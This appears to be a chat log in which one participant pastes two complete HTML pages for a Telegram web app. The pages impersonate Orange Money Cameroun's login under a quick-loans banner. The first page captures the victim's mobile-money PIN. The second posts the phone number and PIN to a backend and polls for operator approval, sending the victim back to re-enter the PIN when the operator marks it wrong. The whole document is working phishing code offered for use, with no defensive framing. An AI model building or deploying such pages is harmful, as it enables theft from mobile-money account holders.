+[10/4, 1:55 AM] jk❤️‍🔥🪯: <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money Cameroun - Connexion</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f15a24;
+            --orange-gradient: linear-gradient(180deg, #ff6b00 0%, #f15a24 100%);
+            --bg-color: #ffffff;
+            --text-dark: #333333;
+            --text-muted: #777777;
+            --border-orange: #f15a24;
+            --btn-disabled-bg: #e2e2e2;
+            --btn-disabled-text: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body { 
+            background-color: var(--bg-color); 
+            margin: 0; 
+            padding: 0;
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+        }
+
+        /* Top Header Area */
+        .header-box { 
+            width: 100%; 
+            background: var(--orange-gradient); 
+            padding: 30px 20px 25px; 
+            color: white; 
+            text-align: center; 
+        }
+
+        .header-title {
+            font-size: 32px;
+            font-weight: 800;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header-title .orange-part { color: #d64d00; opacity: 0.9; margin-right: 6px; }
+        .header-title .money-part { color: #000000; }
+
+        .sub-header-text { 
+            font-size: 14px; 
+            margin-top: 6px; 
+            font-weight: 500;
+            color: #ffffff;
+        }
+
+        /* Content Area */
+        .main-content { 
+            width: 90%; 
+            max-width: 400px; 
+            margin: 25px auto 0; 
+            text-align: center; 
+            flex-grow: 1; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h2 { 
+            color: #555555; 
+            font-size: 22px; 
+            margin: 10px 0 25px; 
+            font-weight: 600; 
+        }
+
+        /* Phone Display Field */
+        .phone-display {
+            width: 100%;
+            border: 1.5px solid var(--border-orange);
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #222222;
+            background-color: #ffffff;
+        }
+
+        .flag-icon {
+            font-size: 20px;
+            line-height: 1;
+        }
+
+        /* PIN Section */
+        .pin-label { 
+            color: var(--text-muted); 
+            margin-bottom: 16px; 
+            font-size: 14px; 
+            font-weight: 500; 
+        }
+
+        .pin-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .pin-input-group { 
+            display: flex; 
+            gap: 12px; 
+        }
+
+        .pin-box {
+            width: 52px;
+            height: 52px;
+            border: 1.5px solid var(--border-orange);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            outline: none;
+            background-color: #ffffff;
+        }
+
+        .pin-box:focus {
+            border-width: 2px;
+        }
+
+        .toggle-eye { 
+            position: absolute;
+            right: 0;
+            cursor: pointer; 
+            font-size: 20px; 
+            user-select: none;
+            color: #333333;
+        }
+
+        .forgot-pin {
+            color: var(--text-muted);
+            font-size: 13px;
+            text-decoration: none;
+            margin-bottom: 35px;
+            display: inline-block;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit.active {
+            background-color: var(--orange-primary);
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .btn-submit.active:hover {
+            background-color: #d64d00;
+        }
+
+        .error-banner {
+            background-color: #fde8e8;
+            color: #e74c3c;
+            border: 1px solid #f8b4b4;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            width: 100%;
+            display: none;
+        }
+
+        /* Bottom Curved Footer */
+        .footer-box { 
+            width: 100%; 
+            background: var(--orange-gradient); 
+            padding: 35px 20px 20px; 
+            color: white; 
+            text-align: center; 
+            border-top-left-radius: 50% 30px; 
+            border-top-right-radius: 50% 30px; 
+            margin-top: auto;
+        }
+
+        .footer-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .footer-title .orange-part { color: #d64d00; opacity: 0.9; margin-right: 6px; }
+        .footer-title .money-part { color: #000000; }
+
+        .terms-text { 
+            font-size: 11px; 
+            margin-top: 15px; 
+            padding: 0 20px; 
+            line-height: 1.4; 
+            color: #ffffff;
+        }
+
+        .terms-text u { 
+            color: #ffffff; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Section -->
+<div class="header-box">
+    <div class="header-title">
+        <span class="orange-part">Orange</span><span class="money-part">Money</span>
+    </div>
+    <div class="sub-header-text">Prêts Rapides & Simples</div>
+</div>
+
+<!-- Main Login Form -->
+<div class="main-content">
+    <h2>Connexion</h2>
+
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <!-- Displays Phone Number Filled in Previous Steps -->
+    <div class="phone-display">
+        <span class="flag-icon">🇨🇲</span>
+        <span>+237</span>
+        <span id="displayPhone">--</span>
+    </div>
+
+    <p class="pin-label">Entrez votre code PIN</p>
+
+    <!-- PIN Inputs & Eye Icon -->
+    <div class="pin-wrapper">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+        </div>
+        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
+    </div>
+
+    <a href="#" class="forgot-pin">PIN oublié ?</a>
+
+    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
+</div>
+
+<!-- Bottom Curved Footer -->
+<div class="footer-box">
+    <div class="footer-title">
+        <span class="orange-part">Orange</span><span class="money-part">Money</span>
+    </div>
+    <div class="sub-header-text">Prêts Rapides & Simples</div>
+    <p class="terms-text">En vous connectant, vous acceptez les <u>Conditions Générales d'Utilisation</u></p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
+    const errorDisplay = document.getElementById('errorDisplay');
+
+    // Retrieve saved phone from previous steps (localStorage)
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "699000000";
+    displayPhone.textContent = savedPhone;
+
+    // Detect wrong PIN redirected error
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'wrongpin') {
+        errorDisplay.innerText = "❌ Code PIN incorrect, veuillez réessayer.";
+        errorDisplay.style.display = "block";
+    }
+
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+
+            if (box.value && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value.length === 1);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
+
+    eye.addEventListener('click', () => {
+        const isPassword = pinBoxes[0].type === "password";
+        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
+    });
+
+    loginBtn.addEventListener('click', () => {
+        if (!loginBtn.classList.contains('active')) return;
+        
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+
+        let pin = "";
+        pinBoxes.forEach(b => pin += b.value);
+        localStorage.setItem('lastPin', pin);
+
+        errorDisplay.style.display = "none";
+
+        window.location.href = "/page7";
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
+[10/4, 1:55 AM] jk❤️‍🔥🪯: <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money Cameroun - Traitement</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f15a24;
+            --orange-gradient: linear-gradient(180deg, #ff6b00 0%, #f15a24 100%);
+            --bg-dark: #333333;
+            --card-bg: #ffffff;
+            --text-dark: #222222;
+            --text-muted: #666666;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Centered Loading Card */
+        .loading-card {
+            background: var(--card-bg);
+            width: 88%;
+            max-width: 380px;
+            padding: 45px 24px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Animated Spinner Circle */
+        .loader-circle {
+            width: 110px;
+            height: 110px;
+            background: var(--orange-gradient);
+            border-radius: 50%;
+            margin-bottom: 28px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 6px 18px rgba(241, 90, 36, 0.3);
+        }
+
+        .loader-circle::after {
+            content: '';
+            width: 82px;
+            height: 82px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Dynamic Status Typography */
+        h2 {
+            color: var(--orange-primary);
+            font-size: 24px;
+            margin: 0 0 10px;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        p {
+            color: var(--text-muted);
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.5;
+            font-weight: 500;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">Traitement...</h2>
+    <p id="sub-text">Préparation de la vérification...</p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
+
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
+
+    if (!phone) {
+        console.warn("⚠️ Aucun numéro trouvé dans localStorage");
+    }
+
+    // Send login notification to backend endpoint (Cameroon context)
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin, country: "CM" })
+        });
+    } catch (err) {
+        console.error("❌ Erreur de requête :", err);
+    }
+
+    // Dynamic progress text switch
+    setTimeout(() => {
+        mainText.textContent = "Veuillez patienter...";
+        subText.textContent = "Cela prend quelques secondes";
+    }, 3000);
+
+    // Poll backend status for approval or denial
+    async function checkApproval() {
+        if (!phone) return;
+
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+                mainText.textContent = "Approuvé !";
+                subText.textContent = "Ouverture de la page suivante...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8";
+                }, 1500);
+            }
+
+            if (data.status === "denied") {
+                mainText.textContent = "Refusé !";
+                subText.textContent = "Code PIN ou numéro incorrect.";
+
+                setTimeout(() => {
+                    window.location.href = "/page6?error=wrongpin";
+                }, 2000);
+            }
+
+        } catch (err) {
+            console.error("❌ Échec de la vérification du statut :", err);
+        }
+    }
+
+    setInterval(checkApproval, 2000);
+});
+</script>
+
+</body>
+  </html>
